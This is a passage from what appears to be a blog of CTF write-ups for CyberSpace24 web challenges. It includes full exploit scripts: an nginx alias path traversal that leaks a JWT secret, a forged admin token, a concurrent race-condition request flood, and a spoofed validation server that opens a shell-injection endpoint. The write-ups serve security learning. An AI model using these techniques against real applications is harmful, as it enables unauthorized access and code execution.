download COPY . . ENV GIN_MODE=release ENV PORT=8000 RUN go build -o /app/chall FROM postgres:alpine RUN apk update \u0026amp;\u0026amp; apk add --no-cache nginx COPY nginx.conf /etc/nginx/nginx.conf COPY run.sh /usr/local/bin/run.sh COPY init.sql /docker-entrypoint-initdb.d/init.sql WORKDIR /app COPY --from=builder /app/chall /app/chall COPY static static COPY templates templates ENTRYPOINT [\u0026#34;sh\u0026#34;, \u0026#34;/usr/local/bin/run.sh\u0026#34;] This Dockerfile creates a multi-stage build for a web application. In the first stage, it uses the Go language to build the application. In the second stage, it sets up a PostgreSQL container with Nginx and copies the built application, configuration files, and other resources. It then runs a script to start the application.\nThe run.sh script is the entrypoint of the application. Let\u0026rsquo;s check that:\nrun.sh #!/bin/env sh cat /dev/urandom | head | sha1sum | cut -d \u0026#34; \u0026#34; -f 1 \u0026gt; /app/jwt.secret export JWT_SECRET_KEY=notsosecurekey export ADMIN_FLAG=CSCTF{flag1} export POST_FLAG=CSCTF{flag2} export SUPERADMIN_FLAG=CSCTF{flag3} export REV_FLAG=CSCTF{flag4} export POSTGRES_USER=postgres export POSTGRES_PASSWORD=mysecretpassword export POSTGRES_DB=devdb uuid=$(cat /proc/sys/kernel/random/uuid) user=$(cat /dev/urandom | head | md5sum | cut -d \u0026#34; \u0026#34; -f 1) cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /docker-entrypoint-initdb.d/init.sql INSERT INTO users (username, password, role) VALUES (\u0026#39;superadmin\u0026#39;, \u0026#39;superadmin\u0026#39;, \u0026#39;superadmin\u0026#39;); INSERT INTO posts (postid, username, title, data) VALUES (\u0026#39;$uuid\u0026#39;, \u0026#39;$user\u0026#39;, \u0026#39;Welcome to the CTF!\u0026#39;, \u0026#39;$ADMIN_FLAG\u0026#39;); EOF docker-ensure-initdb.sh \u0026amp; GIN_MODE=release /app/chall \u0026amp; sleep 5 su postgres -c \u0026#34;postgres -D /var/lib/postgresql/data\u0026#34; \u0026amp; nginx -g \u0026#39;daemon off;\u0026#39; This script initializes the Docker container environment. It generates a random JWT secret and sets various environment variables including flags and database credentials. It creates an initial SQL script for the database with user and post entries, starts the application and PostgreSQL, and then launches Nginx.\nSince the actual challenge consists of 4 independent parts (trend[number-of-z]), we can deduce based on the challenge name, that the flag we\u0026rsquo;re looking for is ADMIN_FLAG.\nLet\u0026rsquo;s search in the codebase to see where this flag is mentioned.\nNote: you can check the source code of the application alone, since the code base is a bit bigger than what a writeup could handle, I\u0026rsquo;ll entrust the process of understanding the api to you.\nSearching for the keyword, we get one occurrence in handlers/dashboard/AdminDash.go, more specifically in the AdminDashboard function that looks like this:\nfunc AdminDashboard(ctx *gin.Context) { posts := service.GetAllPosts() ctx.HTML(200, \u0026#34;adminDash.tmpl\u0026#34;, gin.H{ \u0026#34;flag\u0026#34;: os.Getenv(\u0026#34;ADMIN_FLAG\u0026#34;), \u0026#34;posts\u0026#34;: posts, }) } If we are admin, we can view all the posts, among which is the desired post which contains the flag.\nHowever, we have a problem, we\u0026rsquo;re mere users, how can we change our role to admin.\nThe application uses JWT tokens for access control. It uses accessToken only to validate admins.\nLet\u0026rsquo;s dive deeper into the codebase, where is the AdminDashboard mentioned again?\nOne occurence in the main.go script under the admin group. To access the admin dashboard, we first have to validate the access token, then we have to validate the admin. Let\u0026rsquo;s check the code for both:\nJWTAuth.go func ValidateAccessToken(encodedToken string) (*jwt.Token, error) { return jwt.Parse(encodedToken, func(token *jwt.Token) (interface{}, error) { _, isValid := token.Method.(*jwt.SigningMethodHMAC) if !isValid { return nil, fmt.Errorf(\u0026#34;invalid token with signing method: %v\u0026#34;, token.Header[\u0026#34;alg\u0026#34;]) } return []byte(secretKey), nil }) } This Go function validates a JWT by parsing it and checking the signing method. It ensures the token uses HMAC signing and verifies it with a secret key. If the signing method is incorrect, it returns an error.\nThe secret key is found in the jwt.secret a the root of the application. Seeems we needs to retrieve that hmmm\u0026hellip;\nOkay, Let\u0026rsquo;s check the admin validation code:\nValidateAdmin.go func ValidateAdmin() gin.HandlerFunc { return func(c *gin.Context) { const bearerSchema = \u0026#34;Bearer \u0026#34; var tokenDetected bool = false var tokenString string authHeader := c.GetHeader(\u0026#34;Authorization\u0026#34;) if len(authHeader) != 0 { tokenDetected = true tokenString = authHeader[len(bearerSchema):] } if !tokenDetected { var err error tokenString, err = c.Cookie(\u0026#34;accesstoken\u0026#34;) if tokenString == \u0026#34;\u0026#34; || err != nil { c.Redirect(302, \u0026#34;/getAccessToken?redirect=\u0026#34;+c.Request.URL.Path) } } fmt.Println(tokenString) claims := jwt.ExtractClaims(tokenString) if claims[\u0026#34;role\u0026#34;] == \u0026#34;admin\u0026#34; || claims[\u0026#34;role\u0026#34;] == \u0026#34;superadmin\u0026#34; { fmt.Println(claims) } else { fmt.Println(\u0026#34;Token is not valid\u0026#34;) c.AbortWithStatusJSON(403, gin.H{\u0026#34;error\u0026#34;: \u0026#34;User Unauthorized\u0026#34;}) return } } } This Go function is a Gin middleware that checks if the request has a valid JWT token with an \u0026ldquo;admin\u0026rdquo; or \u0026ldquo;superadmin\u0026rdquo; role. It first looks for the token in the \u0026ldquo;Authorization\u0026rdquo; header or a cookie. If not found or invalid, it redirects the user to obtain an access token or returns a 403 Unauthorized error.\nInteresting, if we can craft our own valid JWT token, with role admin (or superadmin, but that\u0026rsquo;s for another challenge), we can access the admin dashboard, from which we can retrieve the hidden post that has the flag.\nExploitation You should note, that without the jwt.secret contents, we can\u0026rsquo;t do anything.\nWe are not given a custom nginx configuration for nothing though, if we check the config\nuser nobody; worker_processes auto; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; location / { proxy_pass http://localhost:8000; } location /static { alias /app/static/; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } } We can see that /static is aliased to /app/static/, with no restriction for which files we can access (including jwt.secret), thus enabling us to navigate to /static../jwt.secret, which is aliased to /app/static/../jwt.secret, that is the secret key used to sign the JWT token.\nGreat! we got the key. Now let\u0026rsquo;s craft our valid JWT token using the following script\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; \u0026#34;time\u0026#34; \u0026#34;github.com/golang-jwt/jwt/v5\u0026#34; ) var secretKey = []byte{} func InitJWT() { key, err := os.ReadFile(\u0026#34;jwt.secret\u0026#34;) if err != nil { panic(err) } secretKey = key[:] } func GenerateAccessToken(username string, role string) (string, error) { token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{ \u0026#34;username\u0026#34;: username, \u0026#34;exp\u0026#34;: time.Now().Add(time.Minute * 10).Unix(), \u0026#34;role\u0026#34;: role, \u0026#34;iat\u0026#34;: time.Now().Unix(), }) signedToken, err := token.SignedString(secretKey) if err != nil { signedToken = \u0026#34;\u0026#34; } return signedToken, err } func main() { InitJWT() token, err := GenerateAccessToken(\u0026#34;hxuu\u0026#34;, \u0026#34;admin\u0026#34;) if err != nil { fmt.Println(\u0026#34;Error generating token:\u0026#34;, err) return } fmt.Println(\u0026#34;Generated Token:\u0026#34;, token) } jwt.secret is the file we downloaded previously.\nRunning the script gives us a valid JWT Token.\nNow we just have to login as user hxuu, replace the accesstoken in the cookies with our token, and access /admin/dashboard.\nAwesome, we can see the wanted post id. Let\u0026rsquo;s access it using /user/posts/\u0026lt;id\u0026gt;\nAnd there we go~ Flag is: CSCTF{0a97afb3-64be-4d96-aa52-86a91a2a3c52}\nLessons learned from this challenge:\nJWT Secret Key Exposure: Ensuring sensitive files like JWT secrets are not publicly accessible is crucial to prevent unauthorized access. Token Crafting: Crafting a valid JWT token can allow you to bypass access controls if the secret key is known. Nginx Configuration: Be aware of Nginx configurations that could expose sensitive files through aliases or improper restrictions. Access Control: Properly validate and handle user roles and permissions to secure admin and sensitive functionalities. ","permalink":"https://hxuu.github.io/blog/ctf/cyberspace24/trendz/","summary":"To solve the \u0026ldquo;Trendz\u0026rdquo; CTF challenge, exploit JWT token validation and secret key exposure. By accessing the \u003ccode\u003e/static\u003c/code\u003e endpoint to retrieve the JWT secret, craft a valid token with the \u0026ldquo;admin\u0026rdquo; role to view the hidden post and obtain the flag.","title":"CyberSpace24 - Trendz"},{"content":"Challenge Description n c p s a a o o m t i l e e n v : g t e o s s t r : : r y e : 1 8 n 7 6 d w 5 z e z b e x p l o i t a t i o n Staying active has its rewards. There\u0026rsquo;s a special gift waiting for you, but it\u0026rsquo;s only available once you\u0026rsquo;ve made more than 12 posts. Keep posting to uncover the surprise!\nNote: Use the instancer and source from part one of this challenge, Trendz.\nAnalysis We\u0026rsquo;re given the following login page\nlet\u0026rsquo;s register and check the main page\nIt a one page website, that enables us to create posts and view them. Checking the challenge description again, it seems that we have to post more than 12 posts to uncover the special \u0026ldquo;gift\u0026rdquo; which is probably the flag. Let\u0026rsquo;s try posting then.\nOops, we can\u0026rsquo;t create more than 10 posts. Why is that? Luckily for us, we\u0026rsquo;re given the source code of the application here\n. ‚îú‚îÄ‚îÄ Dockerfile ‚îú‚îÄ‚îÄ go.mod ‚îú‚îÄ‚îÄ go.sum ‚îú‚îÄ‚îÄ handlers ‚îÇ¬†‚îú‚îÄ‚îÄ custom ‚îÇ¬†‚îÇ¬†‚îî‚îÄ‚îÄ Custom.go ‚îÇ¬†‚îú‚îÄ‚îÄ dashboard ‚îÇ¬†‚îÇ¬†‚îú‚îÄ‚îÄ AdminDash.go ‚îÇ¬†‚îÇ¬†‚îú‚îÄ‚îÄ SuperAdminDash.go ‚îÇ¬†‚îÇ¬†‚îî‚îÄ‚îÄ UserDash.go ‚îÇ¬†‚îú‚îÄ‚îÄ db ‚îÇ¬†‚îÇ¬†‚îî‚îÄ‚îÄ Init.go ‚îÇ¬†‚îú‚îÄ‚îÄ jwt ‚îÇ¬†‚îÇ¬†‚îî‚îÄ‚îÄ JWTAuth.go ‚îÇ¬†‚îî‚îÄ‚îÄ service ‚îÇ¬†‚îú‚îÄ‚îÄ CreateUser.go ‚îÇ¬†‚îú‚îÄ‚îÄ JWTHandler.go ‚îÇ¬†‚îú‚îÄ‚îÄ LoginUser.go ‚îÇ¬†‚îú‚îÄ‚îÄ Posts.go ‚îÇ¬†‚îî‚îÄ‚îÄ ValidateAdmin.go ‚îú‚îÄ‚îÄ init.sql ‚îú‚îÄ‚îÄ jwt.secret ‚îú‚îÄ‚îÄ main.go ‚îú‚îÄ‚îÄ nginx.conf ‚îú‚îÄ‚îÄ readme.md ‚îú‚îÄ‚îÄ run.sh ‚îú‚îÄ‚îÄ static ‚îÇ¬†‚îú‚îÄ‚îÄ css ‚îÇ¬†‚îÇ¬†‚îú‚îÄ‚îÄ admin.css ‚îÇ¬†‚îÇ¬†‚îú‚îÄ‚îÄ bootstrap.min.css ‚îÇ¬†‚îÇ¬†‚îú‚îÄ‚îÄ style.css ‚îÇ¬†‚îÇ¬†‚îî‚îÄ‚îÄ user.css ‚îÇ¬†‚îú‚îÄ‚îÄ index.html ‚îÇ¬†‚îî‚îÄ‚îÄ js ‚îÇ¬†‚îú‚îÄ‚îÄ client-side-templates.js ‚îÇ¬†‚îú‚îÄ‚îÄ htmx.min.js ‚îÇ¬†‚îú‚îÄ‚îÄ json-enc.js ‚îÇ¬†‚îî‚îÄ‚îÄ nunjucks.min.js ‚îî‚îÄ‚îÄ templates ‚îú‚îÄ‚îÄ adminDash.tmpl ‚îú‚îÄ‚îÄ login.tmpl ‚îú‚îÄ‚îÄ main.tmpl ‚îú‚îÄ‚îÄ register.tmpl ‚îú‚îÄ‚îÄ superAdminDash.tmpl ‚îú‚îÄ‚îÄ userDash.tmpl ‚îî‚îÄ‚îÄ viewPost.tmpl It\u0026rsquo;s a go application then, let\u0026rsquo;s check the Dockerfile\nDockerfile FROM golang:alpine AS builder RUN apk update \u0026amp;\u0026amp; apk add --no-cache git WORKDIR /app COPY go.mod go.sum ./ RUN go mod download COPY . . ENV GIN_MODE=release ENV PORT=8000 RUN go build -o /app/chall FROM postgres:alpine RUN apk update \u0026amp;\u0026amp; apk add --no-cache nginx COPY nginx.conf /etc/nginx/nginx.conf COPY run.sh /usr/local/bin/run.sh COPY init.sql /docker-entrypoint-initdb.d/init.sql WORKDIR /app COPY --from=builder /app/chall /app/chall COPY static static COPY templates templates ENTRYPOINT [\u0026#34;sh\u0026#34;, \u0026#34;/usr/local/bin/run.sh\u0026#34;] This Dockerfile creates a multi-stage build for a web application. In the first stage, it uses the Go language to build the application. In the second stage, it sets up a PostgreSQL container with Nginx and copies the built application, configuration files, and other resources. It then runs a script to start the application.\nThe run.sh script is the entrypoint of the application. Let\u0026rsquo;s check that:\nrun.sh #!/bin/env sh cat /dev/urandom | head | sha1sum | cut -d \u0026#34; \u0026#34; -f 1 \u0026gt; /app/jwt.secret export JWT_SECRET_KEY=notsosecurekey export ADMIN_FLAG=CSCTF{flag1} export POST_FLAG=CSCTF{flag2} export SUPERADMIN_FLAG=CSCTF{flag3} export REV_FLAG=CSCTF{flag4} export POSTGRES_USER=postgres export POSTGRES_PASSWORD=mysecretpassword export POSTGRES_DB=devdb uuid=$(cat /proc/sys/kernel/random/uuid) user=$(cat /dev/urandom | head | md5sum | cut -d \u0026#34; \u0026#34; -f 1) cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /docker-entrypoint-initdb.d/init.sql INSERT INTO users (username, password, role) VALUES (\u0026#39;superadmin\u0026#39;, \u0026#39;superadmin\u0026#39;, \u0026#39;superadmin\u0026#39;); INSERT INTO posts (postid, username, title, data) VALUES (\u0026#39;$uuid\u0026#39;, \u0026#39;$user\u0026#39;, \u0026#39;Welcome to the CTF!\u0026#39;, \u0026#39;$ADMIN_FLAG\u0026#39;); EOF docker-ensure-initdb.sh \u0026amp; GIN_MODE=release /app/chall \u0026amp; sleep 5 su postgres -c \u0026#34;postgres -D /var/lib/postgresql/data\u0026#34; \u0026amp; nginx -g \u0026#39;daemon off;\u0026#39; This script initializes the Docker container environment. It generates a random JWT secret and sets various environment variables including flags and database credentials. It creates an initial SQL script for the database with user and post entries, starts the application and PostgreSQL, and then launches Nginx.\nSince the actual challenge consists of 4 independent parts (trend[number-of-z]), we can deduce based on the challenge name, that the flag we\u0026rsquo;re looking for is POST_FLAG.\nLet\u0026rsquo;s search in the codebase to see where this flag is mentioned.\nNote: you can check the source code of the application alone, since the code base is a bit bigger than what a writeup could handle, I\u0026rsquo;ll entrust the process of understanding the api to you.\nSearching for the keyword, we get one occurrence in handlers/service/Posts.go, more specifically in the DisplayFlag function that looks like this:\nfunc DisplayFlag(ctx *gin.Context) { username := ctx.MustGet(\u0026#34;username\u0026#34;).(string) noOfPosts := CheckNoOfPosts(username) if noOfPosts \u0026lt;= 12 { ctx.JSON(200, gin.H{\u0026#34;error\u0026#34;: fmt.Sprintf(\u0026#34;You need %d more posts to view the flag\u0026#34;, 12-noOfPosts)}) return } ctx.JSON(200, gin.H{\u0026#34;flag\u0026#34;: os.Getenv(\u0026#34;POST_FLAG\u0026#34;)}) } Upon calling the function, we check the number of posts (which is a query to the database), if the number of posts \u0026gt; 12, then we return the flag.\nLet\u0026rsquo;s check which endpoint makes call to DisplayFlag.\nOne occurence in the main.go script under the user group.\nIf you look closely at the code, you\u0026rsquo;ll know that the CreatePost function is vulnerable to race conditions because it checks the post count before inserting a new post. If multiple requests are processed simultaneously, each request may see the same count and insert posts, exceeding the allowed limit. This occurs because the count check and insertion are not done atomically, allowing concurrent requests to bypass the limit.\nExploitation Armed with this knowledge, we can create a python script that makes requests concurrently to create more than 12 posts before the count is greater than 10.\nsolve.py import aiohttp import asyncio # endpoint to create posts url = \u0026#39;http://6a6fc715-3148-439c-97a7-401b124afad5.bugg.cc/user/posts/create\u0026#39; # get the accesstoken from the cookies upon login cookies = { \u0026#34;accesstoken\u0026#34;: \u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjUyNzQxMzksImlhdCI6MTcyNTI3MzUzOSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6ImgifQ.PT9VM2KV4dSlp3uNTfRuwsJ_3hfaPKaLWNbkZiWt0TQ\u0026#34; } # POST Data post_data = { \u0026#34;title\u0026#34;: \u0026#34;Race Condition Test\u0026#34;, \u0026#34;data\u0026#34;: \u0026#34;This is the data for the post\u0026#34; } async def send_post(session, semaphore): async with semaphore: async with session.post(url, json=post_data, cookies=cookies) as response: text = await response.text() print(f\u0026#34;Response: {text}\u0026#34;) async def main(): concurrency_limit = 100 # Limit the number of concurrent requests semaphore = asyncio.Semaphore(concurrency_limit) async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=concurrency_limit)) as session: tasks = [send_post(session, semaphore) for _ in range(50)] await asyncio.gather(*tasks) # Run the main function asyncio.run(main()) Running python solve.py should create more than 12 posts. To verify my claim, let\u0026rsquo;s try to access /user/flag to see if we actually get the flag.\nAnd there you go~ Flag is: CSCTF{d2426fb5-a93a-4cf2-b353-eac8e0e9cf94}\nLessons Learned from this challenge:\nRace Conditions: Ensure checks and operations are atomic. Source Code Review: Look for vulnerabilities in code. Concurrency Issues: Test for concurrent request handling. Automated Testing: Use scripts to detect issues. Environment Security: Protect sensitive data in environment variables. ","permalink":"https://hxuu.github.io/blog/ctf/cyberspace24/trendzz/","summary":"The challenge demonstrated a race condition vulnerability in post creation due to non-atomic operations. This allowed concurrent requests to bypass post limits. Key lessons include ensuring atomic operations, reviewing code for vulnerabilities, and using automated scripts for testing.","title":"CyberSpace24 - Trendzz"},{"content":"Challenge Description n c p s a a o o m t i l e e n v : g t e o s s f r : : e y a : 5 1 t 0 8 u w 4 r e e b u e n x l p o l c o k i e t d a t i o n The world\u0026rsquo;s coolest app has a brand new feature! Too bad it\u0026rsquo;s not released until after the CTF..\nNote: Note: The challenge deployment will automatically restart every 15 minutes.\nAnalysis We\u0026rsquo;re given the following web page:\nIt seems that we have to unlock the new feature which is only available after the CTF ends:\nWe obviously can\u0026rsquo;t wait until the CTF ends, luckily for us, we\u0026rsquo;re given the source code for the application here\n. ‚îú‚îÄ‚îÄ Dockerfile ‚îú‚îÄ‚îÄ flag.txt ‚îú‚îÄ‚îÄ nsjail.cfg ‚îî‚îÄ‚îÄ src ‚îú‚îÄ‚îÄ app ‚îÇ¬†‚îú‚îÄ‚îÄ __init__.py ‚îÇ¬†‚îú‚îÄ‚îÄ main.py ‚îÇ¬†‚îú‚îÄ‚îÄ static ‚îÇ¬†‚îÇ¬†‚îú‚îÄ‚îÄ css ‚îÇ¬†‚îÇ¬†‚îÇ¬†‚îú‚îÄ‚îÄ animations.css ‚îÇ¬†‚îÇ¬†‚îÇ¬†‚îî‚îÄ‚îÄ styles.css ‚îÇ¬†‚îÇ¬†‚îî‚îÄ‚îÄ images ‚îÇ¬†‚îÇ¬†‚îî‚îÄ‚îÄ logo.png ‚îÇ¬†‚îî‚îÄ‚îÄ templates ‚îÇ¬†‚îú‚îÄ‚îÄ base.html ‚îÇ¬†‚îú‚îÄ‚îÄ feature.html ‚îÇ¬†‚îú‚îÄ‚îÄ index.html ‚îÇ¬†‚îî‚îÄ‚îÄ release.html ‚îú‚îÄ‚îÄ requirements.txt ‚îú‚îÄ‚îÄ run.sh ‚îî‚îÄ‚îÄ validation_server ‚îî‚îÄ‚îÄ validation.py Looking at the Dockerfile gives:\nFROM python:3.10-slim as chroot ENV PYTHONUNBUFFERED=1 RUN apt-get update \u0026amp;\u0026amp; apt-get install -y curl \u0026amp;\u0026amp; apt-get clean # create a /home/user and cd into it RUN mkdir -p /home/user WORKDIR /home/user # copy flag and src/ to /home/user COPY src/ flag.txt ./ RUN pip install --no-cache-dir -r requirements.txt FROM gcr.io/kctf-docker/challenge@sha256:0f7d757bcda470c3bbc063606335b915e03795d72ba1d8fdb6f0f9ff3757364f COPY --from=chroot / /chroot COPY nsjail.cfg /home/user/ CMD kctf_setup \u0026amp;\u0026amp; \\ kctf_drop_privs nsjail --config /home/user/nsjail.cfg -- /home/user/run.sh This Dockerfile builds a secure CTF challenge environment:\nBuild Stage: Prepares the application by setting up Python, installing dependencies, and copying necessary files. Final Stage: Uses a secure base image, copies the prepared environment, and runs the challenge inside a restricted sandbox (nsjail). Let\u0026rsquo;s check the application now.\nmain.py import subprocess import base64 import json import time import requests import os from flask import Flask, request, render_template, make_response, redirect, url_for from Crypto.Hash import SHA256 from Crypto.PublicKey import ECC from Crypto.Signature import DSS from itsdangerous import URLSafeTimedSerializer app = Flask(__name__) app.secret_key = os.urandom(16) serializer = URLSafeTimedSerializer(app.secret_key) DEFAULT_VALIDATION_SERVER = \u0026#39;http://127.0.0.1:1338\u0026#39; NEW_FEATURE_RELEASE = int(time.time()) + 7 * 24 * 60 * 60 DEFAULT_PREFERENCES = base64.b64encode(json.dumps({ \u0026#39;theme\u0026#39;: \u0026#39;light\u0026#39;, \u0026#39;language\u0026#39;: \u0026#39;en\u0026#39; }).encode()).decode() def get_preferences(): preferences = request.cookies.get(\u0026#39;preferences\u0026#39;) if not preferences: response = make_response(render_template( \u0026#39;index.html\u0026#39;, new_feature=False)) response.set_cookie(\u0026#39;preferences\u0026#39;, DEFAULT_PREFERENCES) return json.loads(base64.b64decode(DEFAULT_PREFERENCES)), response return json.loads(base64.b64decode(preferences)), None @app.route(\u0026#39;/\u0026#39;) def index(): _, response = get_preferences() return response if response else render_template(\u0026#39;index.html\u0026#39;, new_feature=False) @app.route(\u0026#39;/release\u0026#39;) def release(): # we have to get a cookie named access_token token = request.cookies.get(\u0026#39;access_token\u0026#39;) if token: try: # when the token is loaded (from key that we don\u0026#39;t know), it should equal access_granted data = serializer.loads(token) if data == \u0026#39;access_granted\u0026#39;: return redirect(url_for(\u0026#39;feature\u0026#39;)) except Exception as e: print(f\u0026#34;Token validation error: {e}\u0026#34;) # have to go here validation_server = DEFAULT_VALIDATION_SERVER if request.args.get(\u0026#39;debug\u0026#39;) == \u0026#39;true\u0026#39;: preferences, _ = get_preferences() validation_server = preferences.get( \u0026#39;validation_server\u0026#39;, DEFAULT_VALIDATION_SERVER) if validate_server(validation_server): response = make_response(render_template( \u0026#39;release.html\u0026#39;, feature_unlocked=True)) # token has our desired access_granted dumped token = serializer.dumps(\u0026#39;access_granted\u0026#39;) response.set_cookie(\u0026#39;access_token\u0026#39;, token, httponly=True, secure=True) # feature unlocked return response return render_template(\u0026#39;release.html\u0026#39;, feature_unlocked=False, release_timestamp=NEW_FEATURE_RELEASE) @app.route(\u0026#39;/feature\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def feature(): token = request.cookies.get(\u0026#39;access_token\u0026#39;) if not token: return redirect(url_for(\u0026#39;index\u0026#39;)) try: data = serializer.loads(token) if data != \u0026#39;access_granted\u0026#39;: return redirect(url_for(\u0026#39;index\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: # get the text from body to_process = request.form.get(\u0026#39;text\u0026#39;) try: # RCE here word_count = f\u0026#34;echo {to_process} | wc -w\u0026#34; output = subprocess.check_output( word_count, shell=True, text=True) except subprocess.CalledProcessError as e: output = f\u0026#34;Error: {e}\u0026#34; return render_template(\u0026#39;feature.html\u0026#39;, output=output) return render_template(\u0026#39;feature.html\u0026#39;) except Exception as e: print(f\u0026#34;Error: {e}\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) def get_pubkey(validation_server): try: response = requests.get(f\u0026#34;{validation_server}/pubkey\u0026#34;) response.raise_for_status() return ECC.import_key(response.text) except requests.RequestException as e: raise Exception( f\u0026#34;Error connecting to validation server for public key: {e}\u0026#34;) def validate_access(validation_server): pubkey = get_pubkey(validation_server) try: response = requests.get(validation_server) response.raise_for_status() data = response.json() date = data[\u0026#39;date\u0026#39;].encode(\u0026#39;utf-8\u0026#39;) signature = bytes.fromhex(data[\u0026#39;signature\u0026#39;]) verifier = DSS.new(pubkey, \u0026#39;fips-186-3\u0026#39;) verifier.verify(SHA256.new(date), signature) return int(date) except requests.RequestException as e: raise Exception(f\u0026#34;Error validating access: {e}\u0026#34;) def validate_server(validation_server): try: date = validate_access(validation_server) return date \u0026gt;= NEW_FEATURE_RELEASE except Exception as e: print(f\u0026#34;Error: {e}\u0026#34;) return False if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=1337) This Flask application manages feature access using a cookie-based token system. Users accessing the /release route may receive an access token if they are validated by a server. If the server\u0026rsquo;s public key verifies a valid date, the feature is unlocked, and the token is set. The /feature route allows text processing with potential Remote Code Execution (RCE) via a subprocess command. It also fetches a public key and verifies server access using digital signatures. The application defaults to a basic theme and language in user preferences, which can be updated based on cookies.\nInteresting, the server uses the validation server hosted on localhost port 1338 to validate the access. Let\u0026rsquo;s check how this latter is implemented:\nvalidation.py from flask import Flask, jsonify import time from Crypto.Hash import SHA256 from Crypto.PublicKey import ECC from Crypto.Signature import DSS app = Flask(__name__) key = ECC.generate(curve=\u0026#39;p256\u0026#39;) pubkey = key.public_key().export_key(format=\u0026#39;PEM\u0026#39;) @app.route(\u0026#39;/pubkey\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def get_pubkey(): return pubkey, 200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain; charset=utf-8\u0026#39;} @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def index(): date = str(int(time.time())) h = SHA256.new(date.encode(\u0026#39;utf-8\u0026#39;)) signature = DSS.new(key, \u0026#39;fips-186-3\u0026#39;).sign(h) return jsonify({ \u0026#39;date\u0026#39;: date, \u0026#39;signature\u0026#39;: signature.hex() }) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;127.0.0.1\u0026#39;, port=1338) In simple terms, this validation server helps the main application check if it should unlock features. It does this by providing a way to verify if a timestamp given by the server is genuine. When the main application asks the server, it gets a timestamp and a special code showing it‚Äôs real. The main application then uses this code to confirm that the server\u0026rsquo;s timestamp is valid before unlocking any features.\nIn more technical terms, the validation server returns a date which is later compared to the NEW_FEATURE_RELEASE date, if the date given by the validation server is greater than the latter, the feature is unlocked (access_granted set, by extension we get RCE)\n# validate server function date = validate_access(validation_server) return date \u0026gt;= NEW_FEATURE_RELEASE However, the server used by the application currently doesn\u0026rsquo;t serve us well. Only if we could redirect the application onto a server of our own\u0026hellip;\nIt turns out, when the debug query parameter is set to true in the /release route, the application allows overriding the default validation server with one specified in the user\u0026rsquo;s cookie preferences. If the custom server is validated successfully, it may issue an access token granting feature access. This setup could potentially be exploited if the custom validation server is not securely configured.\nThis is exactly what we want, we can host our own server which instead of returning the current date, it returns a date greater that NEW_FEATURE_RELEASE. After that, we can send a POST request to /feature with text equal to our payload which retrieves the flag.txt file.\nExploitation Let\u0026rsquo;s first write our own custom-validation.py server, host it and tunnel our localhost using beeceptor\ncustom-validation.py from flask import Flask, jsonify, request import time from Crypto.Hash import SHA256 from Crypto.PublicKey import ECC from Crypto.Signature import DSS app = Flask(__name__) # Generate a key and public key key = ECC.generate(curve=\u0026#39;p256\u0026#39;) pubkey = key.public_key().export_key(format=\u0026#39;PEM\u0026#39;) # Constants DEFAULT_VALIDATION_SERVER = \u0026#39;http://127.0.0.1:1338\u0026#39; @app.route(\u0026#39;/pubkey\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def get_pubkey(): return pubkey, 200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain; charset=utf-8\u0026#39;} @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def index(): date = str(int(time.time())) h = SHA256.new(date.encode(\u0026#39;utf-8\u0026#39;)) signature = DSS.new(key, \u0026#39;fips-186-3\u0026#39;).sign(h) # Bypass validation by always returning a valid date and signature # Ensure the date is in the future to always pass the validation valid_date = str(int(time.time()) + 10 * 24 * 60 * 60) # Valid for 10 days in the future valid_signature = DSS.new(key, \u0026#39;fips-186-3\u0026#39;).sign(SHA256.new(valid_date.encode(\u0026#39;utf-8\u0026#39;))) return jsonify({ \u0026#39;date\u0026#39;: valid_date, \u0026#39;signature\u0026#39;: valid_signature.hex() }) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;127.0.0.1\u0026#39;, port=1338) This here always returns a valid date. Let\u0026rsquo;s now create our gen.py script to get the acess_granted cookie.\ngen.py import requests import base64 import json import time # Configuration BASE_URL = \u0026#39;https://feature-unlocked-web.challs.csc.tf\u0026#39; RELEASE_ENDPOINT = \u0026#39;/release\u0026#39; PREFERENCES_COOKIE_NAME = \u0026#39;preferences\u0026#39; DEFAULT_PREFERENCES = { \u0026#39;theme\u0026#39;: \u0026#39;light\u0026#39;, \u0026#39;language\u0026#39;: \u0026#39;en\u0026#39;, \u0026#39;validation_server\u0026#39;: \u0026#39;https://\u0026lt;id\u0026gt;.free.beeceptor.com\u0026#39; # This should match the modified validation server URL } # Encode preferences as base64 encoded_preferences = base64.b64encode( json.dumps(DEFAULT_PREFERENCES).encode() ).decode() # Set the preferences cookie value cookies = { PREFERENCES_COOKIE_NAME: encoded_preferences } # Make the GET request to /release with debug=true response = requests.get( f\u0026#39;{BASE_URL}{RELEASE_ENDPOINT}\u0026#39;, params={\u0026#39;debug\u0026#39;: \u0026#39;true\u0026#39;}, cookies=cookies, allow_redirects=False # Avoid following redirects to see the response directly ) # Print the response print(f\u0026#34;Status Code: {response.status_code}\u0026#34;) print(f\u0026#34;Response Headers: {response.headers}\u0026#34;) print(f\u0026#34;Response Text: {response.text}\u0026#34;) # If the response includes a \u0026#39;Set-Cookie\u0026#39; header, print it to check the access_token if \u0026#39;Set-Cookie\u0026#39; in response.headers: print(f\u0026#34;Set-Cookie Header: {response.headers[\u0026#39;Set-Cookie\u0026#39;]}\u0026#34;) 